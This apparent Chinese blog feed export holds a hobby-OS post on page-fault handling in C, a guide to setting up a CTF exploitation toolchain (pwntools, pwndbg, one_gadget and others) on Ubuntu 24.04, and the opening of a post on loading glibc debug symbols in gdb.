<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// kernel/panic.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">panic</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span>;</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// kernel/panic.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;printf.h&quot;</span> <span class="comment">// 假设你有 screen_print()</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">panic</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message)</span> &#123;</span><br><span class="line">    <span class="comment">// 停止中断，防止系统进一步运行</span></span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;cli&quot;</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印信息（可用你自己写的 printf 或 screen_write）</span></span><br><span class="line">    kernel_printf(<span class="string">&quot;\n[!! KERNEL PANIC !!]\n&quot;</span>);</span><br><span class="line">    kernel_printf(<span class="string">&quot; %s\n&quot;</span>, message);</span><br><span class="line">    kernel_printf(<span class="string">&quot; System halted.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 死循环+HLT指令让CPU停下</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;hlt&quot;</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h4 id="缺页异常实现">缺页异常实现</h4>
<p>缺页异常通常发生由以下四点触发：</p>
<ul>
<li><p><strong>访问了一个尚未映射的虚拟地址</strong></p></li>
<li><p><strong>访问了没有权限的页面（如写一个只读页）</strong></p></li>
<li><p><strong>访问了被页保护（protection
bits）限制的页面</strong></p></li>
<li><p><strong>页表条目存在但页框没加载到内存（如 demand
paging）</strong></p></li>
</ul>
<p>当发生 Page Fault 异常时，<strong>CPU
会自动把“访问失败的虚拟地址”放入
<code>CR2</code></strong>，供异常处理函数使用。</p>
<p>而且触发 page fault 时，CPU
会自动压栈错误码（<code>uint32_t</code>），含义如下：</p>
<table>
<colgroup>
<col style="width: 5%" />
<col style="width: 17%" />
<col style="width: 76%" />
</colgroup>
<thead>
<tr>
<th>Bit</th>
<th>名称</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>P（Present）</td>
<td>0 = 页不存在（没映射）；1 = 页存在（但访问违规）</td>
</tr>
<tr>
<td>1</td>
<td>W/R</td>
<td>0 = 读引起；1 = 写引起</td>
</tr>
<tr>
<td>2</td>
<td>U/S</td>
<td>0 = CPL=0（内核）；1 = CPL=3（用户）</td>
</tr>
<tr>
<td>3</td>
<td>RSVD</td>
<td>页表中保留位被错误设置（对某些 CPU 有效）</td>
</tr>
<tr>
<td>4</td>
<td>I/D</td>
<td>0 = 数据访问；1 = 指令执行（仅某些CPU支持执行权限）</td>
</tr>
</tbody>
</table>
<p>首先为缺页异常（14）写一个回调函数，先从cr2读取到触发缺页异常的地址，然后从传入的寄存器状态可以得到<strong>error_code</strong>，用来判断是由什么触发了缺页异常，进而分别进行处理。一般而言缺页异常都会发生在用户态，内核态的内存一开始就需要全部映射好。所以要进行判断触发缺页异常的地址是否在合理的用户态地址范围内，由于<strong>0xC0000000</strong>开始的虚拟地址一般用来存内核，所以我们将范围限制在<strong>0x1000-0xC0000000</strong>之间，低虚拟地址保留是因为处理addr为<strong>null</strong>的情况。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// kernel/isr.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">isr_install</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">memset</span>(interrupt_handlers, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="type">isr_t</span>) * <span class="number">256</span>);</span><br><span class="line">    idt_set_gate(<span class="number">0</span>, (<span class="type">uint32_t</span>)isr0, <span class="number">0x08</span>, <span class="number">0x8E</span>);  <span class="comment">// div 0 fault</span></span><br><span class="line">    idt_set_gate(<span class="number">6</span>, (<span class="type">uint32_t</span>)isr6, <span class="number">0x08</span>, <span class="number">0x8E</span>);    <span class="comment">// invalid opcode fault</span></span><br><span class="line">    idt_set_gate(<span class="number">13</span>, (<span class="type">uint32_t</span>)isr13, <span class="number">0x08</span>, <span class="number">0x8E</span>);       <span class="comment">// General Protection Fault</span></span><br><span class="line">    idt_set_gate(<span class="number">14</span>, (<span class="type">uint32_t</span>)isr14, <span class="number">0x08</span>, <span class="number">0x8E</span>);      <span class="comment">// Page Fault</span></span><br><span class="line">    idt_set_gate(<span class="number">0x20</span>, (<span class="type">uint32_t</span>)irq0, <span class="number">0x08</span>, <span class="number">0x8E</span>);       <span class="comment">// IRQ0,timer</span></span><br><span class="line">    idt_set_gate(<span class="number">0x21</span>, (<span class="type">unsigned</span>)irq1, <span class="number">0x08</span>, <span class="number">0x8E</span>);        <span class="comment">/// IRQ1,keyboard</span></span><br><span class="line"></span><br><span class="line">    register_interrupt_handler(<span class="number">0</span>, divide_by_zero_handler);</span><br><span class="line">    register_interrupt_handler(<span class="number">6</span>, invalid_opcode_handler);</span><br><span class="line">    register_interrupt_handler(<span class="number">13</span>, general_protection_fault_handler);</span><br><span class="line">    register_interrupt_handler(<span class="number">14</span>, page_fault_handler);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">page_fault_handler</span><span class="params">(<span class="type">registers_t</span> *regs)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> faulting_address;</span><br><span class="line">    <span class="type">uint32_t</span> new_physical_page;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;mov %%cr2, %0&quot;</span> : <span class="string">&quot;=r&quot;</span>(faulting_address))</span>;     <span class="comment">// 获取触发缺页异常的虚拟地址</span></span><br><span class="line">    <span class="type">uint32_t</span> err_code = regs-&gt;err_code;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> present   = err_code &amp; <span class="number">0x1</span>;        <span class="comment">// P 位，0表示页不存在</span></span><br><span class="line">    <span class="type">int</span> rw        = err_code &amp; <span class="number">0x2</span>;        <span class="comment">// W/R 位</span></span><br><span class="line">    <span class="type">int</span> us        = err_code &amp; <span class="number">0x4</span>;        <span class="comment">// U/S 位</span></span><br><span class="line">    <span class="type">int</span> reserved  = err_code &amp; <span class="number">0x8</span>;        <span class="comment">// RSVD 位</span></span><br><span class="line">    <span class="type">int</span> id        = err_code &amp; <span class="number">0x10</span>;       <span class="comment">// I/D 位（少数CPU）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调试信息打印</span></span><br><span class="line">    kernel_printf(<span class="string">&quot;Page fault at 0x%x (err_code: 0x%x): &quot;</span>, faulting_address, err_code);</span><br><span class="line">    <span class="keyword">if</span> (!present)  kernel_printf(<span class="string">&quot;page not present, &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (rw)       kernel_printf(<span class="string">&quot;write, &quot;</span>);</span><br><span class="line">    <span class="keyword">else</span>          kernel_printf(<span class="string">&quot;read, &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (us)       kernel_printf(<span class="string">&quot;user-mode, &quot;</span>);</span><br><span class="line">    <span class="keyword">else</span>          kernel_printf(<span class="string">&quot;kernel-mode, &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (reserved) kernel_printf(<span class="string">&quot;RSVD bit set, &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (id)       kernel_printf(<span class="string">&quot;instruction fetch, &quot;</span>);</span><br><span class="line">    kernel_printf(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 分情况处理</span></span><br><span class="line">    <span class="keyword">if</span> (present == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 说明页是存在的，但权限问题（写了只读页、用户访问内核页）</span></span><br><span class="line">        panic(<span class="string">&quot;Page fault: protection violation&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 缺页，可以考虑是否在合法地址范围内</span></span><br><span class="line">        <span class="keyword">if</span> (is_valid_user_address(faulting_address)) &#123;</span><br><span class="line">            <span class="comment">// 动态分配页框并映射</span></span><br><span class="line">            new_physical_page = pmm_alloc_page();</span><br><span class="line">            kernel_printf(<span class="string">&quot;Allocated page at 0x%x\n&quot;</span>, new_physical_page);</span><br><span class="line">            <span class="keyword">if</span> (!new_physical_page) &#123;</span><br><span class="line">                panic(<span class="string">&quot;Out of memory&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            map_page(faulting_address, new_physical_page, PAGE_USER | PAGE_RW);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 访问了非法地址，比如 NULL deref</span></span><br><span class="line">            panic(<span class="string">&quot;Segmentation Fault: invalid address&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// vmm.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> USER_SPACE_START 0x00001000          <span class="comment">// 跳过 NULL 页</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> USER_SPACE_END   0xC0000000          <span class="comment">// 默认用户空间最大值（3GB）</span></span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_valid_user_address</span><span class="params">(<span class="type">uint32_t</span> addr)</span>;</span><br><span class="line"><span class="comment">// vmm.c</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_valid_user_address</span><span class="params">(<span class="type">uint32_t</span> addr)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> addr &gt;= USER_SPACE_START &amp;&amp; addr &lt; USER_SPACE_END;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>然后这里我们在内核入口中测试一下，访问一个未被映射的地址，先读取后写入。这里我为了调试方便在<strong>page_fault_handler</strong>中打印出了pmm分配的物理地址，然后就可以发现确实是只会触发一次缺页异常，并且写入后我们也可以在对应地址处看到写入的值。（这里还没移除前4MB的恒等映射，所以虚拟地址等于物理地址）</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// kernel/kernel.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;idt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;isr.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;irq.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;printf.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;screen.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;info.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;layout.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pmm.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;vmm.h&quot;</span></span></span><br><span class="line"><span class="comment">// #include &quot;keyboard.h&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kernel_main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    clear_screen();         <span class="comment">// 清屏</span></span><br><span class="line">    print_string(<span class="string">&quot;Hello, Kernel!\n&quot;</span>);  <span class="comment">// 打印一行字符</span></span><br><span class="line">    print_memory_map();</span><br><span class="line">    idt_install();</span><br><span class="line">    irq_remap();</span><br><span class="line">    isr_install();</span><br><span class="line">    irq_install();</span><br><span class="line">    </span><br><span class="line">    pmm_init(MEMORY_MAP_ADDR);      <span class="comment">// 初始化物理内存管理</span></span><br><span class="line">    vmm_init();                     <span class="comment">// 初始化虚拟内存管理，开启分页</span></span><br><span class="line">    test_page_fault();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;sti&quot;</span>)</span>;    <span class="comment">// 开中断</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123; </span><br><span class="line">        <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;hlt&quot;</span>)</span>;  <span class="comment">// 节省CPU</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test_page_fault</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> *ptr = (<span class="type">int</span>*)<span class="number">0x0E000000</span>;  <span class="comment">// 这个地址大概率没有映射</span></span><br><span class="line">    <span class="type">int</span> val = *ptr;  <span class="comment">// 触发 page fault</span></span><br><span class="line">    *ptr = <span class="number">0x666</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%99%A8-%E7%AE%80%E5%8D%95%E5%88%86%E9%A1%B5%E6%9C%BA%E5%88%B6%E5%AE%9E%E7%8E%B0/image-20250512142132051.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%99%A8-%E7%AE%80%E5%8D%95%E5%88%86%E9%A1%B5%E6%9C%BA%E5%88%B6%E5%AE%9E%E7%8E%B0/image-20250512142223887.png"
                      class=""
                >
<h3 id="参考资料">参考资料</h3>
<p>https://ordoflammae.github.io/littleosbook/#linking-the-kernel</p>
]]></content>
      <categories>
        <category>OS</category>
      </categories>
      <tags>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title>快速在24.04Ubuntu搭建pwn环境</title>
    <url>/blog/2025/01/24/%E5%BF%AB%E9%80%9F%E5%9C%A824-04Ubuntu%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<h2 id="快速在24.04ubuntu搭建pwn环境">快速在24.04Ubuntu搭建pwn环境</h2>
<p>打了重庆市赛时，3个pwn题有2个给了2.39glibc，据有些大师傅们说，2.39的glibc只能在24.04的Ubuntu上兼容，我也试了试用<code>glibc-all-in-one</code>，下2.39的glibc，但是下下来是空的。这说明原先22.04Ubuntu的环境已经不够用了，需要新建一个24.04版本的Ubuntu虚拟机来应对各种可能的做题环境。这里顺便记录下快速起pwn环境的步骤。</p>
<h3 id="安装清单">安装清单</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwntools</span><br><span class="line">ROPgadget</span><br><span class="line">seccomp-tools</span><br><span class="line">glibc-all-in-one</span><br><span class="line">patchelf</span><br><span class="line">pwndbg</span><br><span class="line">one_gadget</span><br></pre></td></tr></table></figure></div>
<h3 id="安装24.04ubuntu">0.安装24.04Ubuntu</h3>
<p>这里我选择wsl的安装，直接安装完成后，打开会自动进行进一步的安装以及初始化。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/24/%E5%BF%AB%E9%80%9F%E5%9C%A824-04Ubuntu%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20241209111313097.png"
                      class=""
                >
<h3 id="更新系统">1. 更新系统</h3>
<p>首先，确保你的系统是最新的：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update &amp;&amp; <span class="built_in">sudo</span> apt upgrade -y</span><br></pre></td></tr></table></figure></div>
<h3 id="安装基本工具">2. 安装基本工具</h3>
<p>安装一些常用的开发工具和库：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install -y build-essential gdb python3 python3-pip git</span><br></pre></td></tr></table></figure></div>
<h3 id="安装-pwntools">3. 安装 pwntools</h3>
<p><code>pwntools</code> 是 PWN 环境中常用的 Python
库，用于编写漏洞利用脚本：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install pwntools</span><br></pre></td></tr></table></figure></div>
<p>可能会有报错如下：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/24/%E5%BF%AB%E9%80%9F%E5%9C%A824-04Ubuntu%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20241209111731629.png"
                      class=""
                >
<p>由于 Ubuntu 24.04
使用了<code>externally-managed-environment</code>模式，这种模式下系统不允许直接用
<code>pip</code> 安装全局包。为了避免对系统 Python
环境造成破坏，所以要创建一个虚拟环境来安装 Python 包。</p>
<p><strong>解决方法：使用虚拟环境</strong></p>
<ol type="1">
<li><p><strong>安装 <code>python3-venv</code> 和
<code>python3-pip</code></strong>： 首先，确保你已经安装了
<code>python3-venv</code> 和
<code>python3-pip</code>，这些工具允许你创建虚拟环境并安装 pip 包。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install python3-venv python3-pip</span><br></pre></td></tr></table></figure></div></li>
<li><p><strong>创建虚拟环境</strong>：
创建一个新的虚拟环境，用来安装和管理 <code>pwntools</code>。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m venv pwnenv</span><br></pre></td></tr></table></figure></div></li>
<li><p><strong>激活虚拟环境</strong>：
激活虚拟环境，这样你就可以在隔离的环境中安装 Python 包了。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> pwnenv/bin/activate</span><br></pre></td></tr></table></figure></div>
<p>激活后，你会看到命令提示符前面会加上
<code>(pwnenv)</code>，表示你已经进入虚拟环境。</p></li>
<li><p><strong>安装 <code>pwntools</code></strong>：
在虚拟环境中，你可以使用 <code>pip</code> 安装 <code>pwntools</code>
和其他需要的 Python 包。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure></div></li>
<li><p><strong>退出虚拟环境</strong>：
使用完虚拟环境后，可以通过以下命令退出：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure></div></li>
</ol>
<p><strong>使用 <code>pipx</code>（可选）</strong></p>
<p>如果不想每次都手动激活虚拟环境，可以考虑使用 <code>pipx</code>
来管理独立的 Python 应用程序。<code>pipx</code>
会自动为我们创建虚拟环境并管理依赖。</p>
<ol type="1">
<li><p><strong>安装 <code>pipx</code></strong>：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install pipx</span><br></pre></td></tr></table></figure></div></li>
<li><p><strong>使用 <code>pipx</code> 安装
<code>pwntools</code></strong>：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pipx install pwntools</span><br></pre></td></tr></table></figure></div></li>
</ol>
<p><code>pipx</code> 会自动为你创建一个虚拟环境，并在其中安装
<code>pwntools</code>，你可以直接运行它，而无需手动管理虚拟环境。</p>
<p>但这个pipx亲测太慢了！！！不推荐。</p>
<h3 id="安装-ropgadget">4. 安装 ROPgadget</h3>
<p><code>ROPgadget</code> 是一个用于查找 ROP 链 gadget 的工具：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install ropgadget</span><br></pre></td></tr></table></figure></div>
<h3 id="安装-seccomp-tools">5. 安装 seccomp-tools</h3>
<p><code>seccomp-tools</code> 用于分析和利用 seccomp 过滤器：</p>
<p>安装 Ruby 和 RubyGems</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install -y ruby-full</span><br></pre></td></tr></table></figure></div>
<p>使用 RubyGems 安装 <code>seccomp-tools</code></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> gem install seccomp-tools</span><br></pre></td></tr></table></figure></div>
<p>安装完成后，可以通过以下命令验证安装是否成功：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">seccomp-tools --version</span><br></pre></td></tr></table></figure></div>
<h3 id="安装-glibc-all-in-one">6. 安装 glibc-all-in-one</h3>
<p><code>glibc-all-in-one</code> 包含了不同版本的
glibc，方便进行漏洞测试：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> git <span class="built_in">clone</span> https://github.com/matrix1001/glibc-all-in-one.git</span><br><span class="line"><span class="built_in">cd</span> glibc-all-in-one/</span><br><span class="line"><span class="built_in">sudo</span> python3 update_list</span><br></pre></td></tr></table></figure></div>
<h3 id="安装patchelf">7. 安装patchelf</h3>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/NixOS/patchelf.git</span><br><span class="line"><span class="built_in">cd</span> patchelf</span><br><span class="line">./bootstrap.sh </span><br></pre></td></tr></table></figure></div>
<p>若显示报错</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/24/%E5%BF%AB%E9%80%9F%E5%9C%A824-04Ubuntu%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20241209231226259.png"
                      class=""
                >
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install autoconf automake libtool</span><br><span class="line">./bootstrap.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make check</span><br><span class="line"><span class="built_in">sudo</span> make install</span><br></pre></td></tr></table></figure></div>
<h3 id="安装-pwndbg">8. 安装 pwndbg</h3>
<p><code>pwndbg</code> 是一个为 GDB 提供增强功能的插件，它对调试 PWN
题目非常有用：</p>
<p>装的时候记得先切到之前建立的虚拟环境。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg</span><br><span class="line"><span class="built_in">cd</span> pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure></div>
<p>若产生如下错误，则有可能是网络连接的问题（具体的可以看日志文件）。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/24/%E5%BF%AB%E9%80%9F%E5%9C%A824-04Ubuntu%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20241209233456670.png"
                      class=""
                >
<p>可以配置镜像源加速</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p ~/.pip</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[global]</span></span><br><span class="line"><span class="string">index-url = https://pypi.tuna.tsinghua.edu.cn/simple&quot;</span> &gt; ~/.pip/pip.conf</span><br></pre></td></tr></table></figure></div>
<h3 id="安装-one_gadget">8. 安装 one_gadget</h3>
<p><code>one_gadget</code> 是一个用来快速查找 libc 中单次调用的 RCE
gadget 的工具：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gem install one_gadget</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>env</tag>
      </tags>
  </entry>
  <entry>
    <title>带符号调试-gdb脚本实现自动化加载</title>
    <url>/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/</url>
    <content><![CDATA[<h4 id="问题由来">问题由来</h4>
<p>在对于堆的<code>_IO_FILE</code>利用的学习过程中，我们通常需要伪造一个fake_IO_FILE，并且附带源码调试，以方便清除是否进入了目标函数，是否一些条件判断通过。但是有时候却在pwndbg加载时找不到对应的glibc的symbol
file文件，这就导致我们无法进行源码级别调试，而且看结构体只能自己一个一个字段带进去看，十分麻烦。所以这里介绍一下如何方便地进行带符号调试。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/image-20241123103232492.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/image-20241123103325230.png"
                      class=""
                >
<h4 id="符号文件">符号文件</h4>
<h5 id="build-id">Build ID</h5>
<p><code>Build ID</code> 是 ELF
文件（可执行文件和共享库）中一个独特的标识符，用于标识文件的内容。它是一个不可变的标志，通常用来快速匹配文件与其调试符号或源代码。</p>
<hr />
<h6 id="主要用途"><strong>主要用途</strong></h6>
<ol type="1">
<li><strong>唯一标识 ELF 文件</strong>：
<ul>
<li>即使文件名或路径改变，<code>Build ID</code>
仍然可以唯一标识文件。</li>
<li>不同编译选项或源代码的修改会导致新的 <code>Build ID</code>。</li>
</ul></li>
<li><strong>关联调试符号和源代码</strong>：
<ul>
<li>调试符号文件（如 <code>.debug</code> 文件）通常使用
<code>Build ID</code> 来匹配对应的 ELF 文件。</li>
</ul></li>
<li><strong>软件包管理和安全检查</strong>：
<ul>
<li>用于确保文件未被篡改，或用于匹配特定版本的依赖项。</li>
</ul></li>
</ol>
<hr />
<h6 id="生成方式"><strong>生成方式</strong></h6>
<p><code>Build ID</code> 是通过对 ELF
文件的内容（如代码段和数据段）进行哈希计算生成的，具体方式取决于工具链。它通常由
<strong>编译器</strong> 或 <strong>链接器</strong> 自动生成，存储在 ELF
文件的 <code>.note.gnu.build-id</code> 段中。</p>
<h6 id="查看-elf-文件的-build-id"><strong>查看 ELF 文件的 Build
ID</strong></h6>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">1.readelf -n /path/to/file | grep &#x27;Build ID&#x27;</span><br><span class="line">2.file /path/to/file</span><br></pre></td></tr></table></figure></div>
<h5 id="debug">.debug</h5>
<p>通常<code>symbol file</code>会在一个<code>.debug/.build-id/xx/</code>的目录下，这里在<code>build-id</code>中会有一堆2位16进制数构成的目录名，实际在.debug文件检索时，会先根据<code>build-id</code>的第一个字节（最高位）来进入对应前缀的文件夹，然后在该目录下找对应的.debug文件。比如我们的<code>build-id</code>为<code>89c3cb85f9e55046776471fed05ec441581d1969</code>，那么我们目标的.debug文件就在<code>.debug/.build-id/89/c3cb85f9e55046776471fed05ec441581d1969.debug</code>这个位置。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/23/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95-gdb%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8A%A0%E8%BD%BD/image-20241123105018012.png"
                      class=""
                >
<h4 id="手动加载符号文件">手动加载符号文件</h4>
